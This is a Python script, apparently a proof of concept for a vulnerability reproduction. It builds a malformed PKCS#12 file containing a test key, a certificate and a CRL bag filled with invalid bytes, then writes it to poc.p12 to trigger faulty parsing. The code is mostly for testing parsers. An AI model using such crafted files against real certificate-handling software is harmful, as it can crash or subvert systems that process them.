from pyasn1.type import univ, tag, constraint, namedtype, useful
from pyasn1.codec.der import encoder, decoder
from pyasn1 import error
import os

# PKCS12 OIDs
PKCS7_DATA = univ.ObjectIdentifier('1.2.840.113549.1.7.1')
PKCS9_X509_CERT = univ.ObjectIdentifier('1.2.840.113549.1.9.22.1')
PKCS9_SDSI_CERT = univ.ObjectIdentifier('1.2.840.113549.1.9.22.2')
PKCS9_CRL = univ.ObjectIdentifier('1.2.840.113549.1.9.23.1')
PKCS12_KEY_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.1')
PKCS12_PKCS8_KEY_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.2')
PKCS12_CERT_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.3')
PKCS12_CRL_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.4')
PKCS12_SECRET_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.5')
PKCS12_SAFE_CONTENTS_BAG = univ.ObjectIdentifier('1.2.840.113549.1.12.10.1.6')

# Generate a key and cert using cryptography library
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import datetime

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COMMON_NAME, "test"),
])
cert = x509.CertificateBuilder().subject_name(
    subject
).issuer_name(
    issuer
).public_key(
    key.public_key()
).serial_number(
    1
).not_valid_before(
    datetime.datetime.now()
).not_valid_after(
    datetime.datetime.now() + datetime.timedelta(days=365)
).sign(key, hashes.SHA256())

key_der = key.private_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
cert_der = cert.public_bytes(serialization.Encoding.DER)

# Invalid CRL data - just some random bytes that will fail to parse as a CRL
invalid_crl_der = b'\x00\x01\x02\x03\x04'

# Build SafeBag for key
# SafeBag ::= SEQUENCE { bagId, bagValue[0] EXPLICIT, bagAttributes OPTIONAL }
key_bag_id = PKCS12_PKCS8_KEY_BAG
key_bag_value = univ.AnyVal(key_der).subtype(
    implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
)
key_bag = univ.Sequence()
key_bag.setComponentByPosition(0, key_bag_id)
key_bag.setComponentByPosition(1, key_bag_value)

# Build SafeBag for cert
cert_bag_id = PKCS12_CERT_BAG
# Cert bag value is a CertBag which is SEQUENCE { certId, certValue[0] EXPLICIT }
cert_bag_inner = univ.Sequence()
cert_bag_inner.setComponentByPosition(0, PKCS9_X509_CERT)
cert_bag_inner.setComponentByPosition(1, univ.AnyVal(cert_der).subtype(
    implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
))
cert_bag_value_encoded = encoder.encode(cert_bag_inner)
cert_bag_value = univ.AnyVal(cert_bag_value_encoded).subtype(
    implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
)
cert_bag = univ.Sequence()
cert_bag.setComponentByPosition(0, cert_bag_id)
cert_bag.setComponentByPosition(1, cert_bag_value)

# Build SafeBag for CRL with invalid data
crl_bag_id = PKCS12_CRL_BAG
# CRL bag value is a CrlBag which is SEQUENCE { crlId, crlValue[0] EXPLICIT }
crl_bag_inner = univ.Sequence()
crl_bag_inner.setComponentByPosition(0, PKCS9_CRL)
crl_bag_inner.setComponentByPosition(1, univ.AnyVal(invalid_crl_der).subtype(
    implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
))
crl_bag_value_encoded = encoder.encode(crl_bag_inner)
crl_bag_value = univ.AnyVal(crl_bag_value_encoded).subtype(
    implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
)
crl_bag = univ.Sequence()
crl_bag.setComponentByPosition(0, crl_bag_id)
crl_bag.setComponentByPosition(1, crl_bag_value)

# SafeContents = SEQUENCE OF SafeBag
safe_contents = univ.Sequence()
safe_contents.setComponentByPosition(0, key_bag)
safe_contents.setComponentByPosition(1, cert_bag)
safe_contents.setComponentByPosition(2, crl_bag)

safe_contents_der = encoder.encode(safe_contents)

# ContentInfo ::= SEQUENCE { contentType, content [0] EXPLICIT }
content_info = univ.Sequence()
content_info.setComponentByPosition(0, PKCS7_DATA)
content_info.setComponentByPosition(1, univ.AnyVal(safe_contents_der).subtype(
    explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)
))

auth_safe_der = encoder.encode(content_info)

# PFX ::= SEQUENCE { version INTEGER, authSafe ContentInfo, macData MacData OPTIONAL }
pfx = univ.Sequence()
pfx.setComponentByPosition(0, univ.Integer(3))
pfx.setComponentByPosition(1, content_info)

pfx_der = encoder.encode(pfx)

with open('/workspace/poc.p12', 'wb') as f:
    f.write(pfx_der)

print(f"PoC file created: {len(pfx_der)} bytes")
print(f"First 50 bytes: {pfx_der[:50].hex()}")
PYEOF
